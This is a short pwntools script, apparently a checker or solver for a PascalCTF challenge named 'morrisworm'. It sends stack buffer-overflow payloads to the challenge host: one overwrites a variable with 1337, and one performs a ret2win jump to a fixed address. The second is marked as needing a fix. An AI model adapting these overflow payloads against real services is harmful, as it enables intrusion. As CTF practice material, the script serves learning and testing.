#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import remote, p32, p64, context

def checker():
    r = remote(DOMAIN, PORT)

    PAYLOAD = b'A' * 44 + p32(1337)
    r.recvuntil(b'?\n')
    r.sendline(PAYLOAD + b'\x00')
    r.recvuntil(b': ')
    print(r.recvline().decode().strip())
    r.close()
    
def checker2():
    r = remote(DOMAIN, PORT)
    WIN_ADDR = 0x4011D7
    PAYLOAD = b'A' * 48 + b'B' * 8 + p64(WIN_ADDR) 
    
    r.recvuntil(b'?\n')
    r.sendline(PAYLOAD)
    r.recvuntil(b': ')
    print(r.recvline().decode())
    r.close()

if __name__ == '__main__':
    DOMAIN = "morrisworm.challs.pascalctf.it"
    PORT = 1337
    
    context.log_level = 'error'
    
    checker()
    # checker2() # TODO : Fix this checker